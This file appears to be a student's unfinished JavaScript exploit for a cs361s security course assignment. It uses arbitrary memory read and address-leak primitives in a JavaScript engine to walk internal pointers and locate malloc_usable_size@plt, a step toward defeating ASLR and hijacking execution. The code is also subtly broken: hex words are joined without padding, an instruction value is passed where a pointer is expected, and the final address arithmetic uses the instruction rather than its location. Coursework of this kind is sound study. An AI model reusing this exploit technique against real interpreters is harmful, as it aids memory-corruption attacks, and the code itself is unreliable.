/*
 * TODO: Part C solution goes here!
 */

let addrof = cs361s.addrof;
let readmem = cs361s.readmem;
let writemem = cs361s.writemem;

function strToHex(str) {
        return Number("0x" + str);
}

//Returns 4-byte word at ptr (takes a number, not a string)
function readHalfWord(ptr) {
	return Number("0x" + readmem(ptr).toString(16));
}

//Returns 8-byte word at ptr (takes a number, not a string)
function readWord(ptr) {
	return Number("0x" + readmem(ptr + 4).toString(16) + readmem(ptr).toString(16));
}

//Returns 20-bit offset at ptr (takes as number, not a string)
//Most significant bit is sign bit; right shift by 11 because it does multiples of 2
function readOffset(ptr) {
	let halfWord = readHalfWord(ptr);
	return (halfWord >> 11) & 0x1fffff;
}

let context_ptr_ptr = addrof(console.log) + 0x30; //where the 8 bytes of ctx are located
let context_ptr = readWord(context_ptr_ptr);
let rt_ptr = readWord(context_ptr + 0x18); //pointer to ctx->rt
let js_def_malloc_usable_size_ptr = readWord(rt_ptr + 0x18); //address of js_def_malloc_usable_size symbol
let jal_ptr = js_def_malloc_usable_size_ptr + 0x10; //address of jal in js_defmalloc_usable_size to malloc_usable_size@plt
let jal_ins = readHalfWord(jal_ptr); //the jal instruction. Parse bits to get the offset

let jal_offs = readOffset(jal_ins); //20 bit offset (but leftshifted by 1)
let sign = jal_offs & 0x100000 ? -1 : 1; //logic here might be iffy
jal_offs &= 0xfffff;

let malloc_usable_size_plt_ptr = jal_ins + jal_offs * sign; //this should be the auipc ins in malloc_usable_size@plt


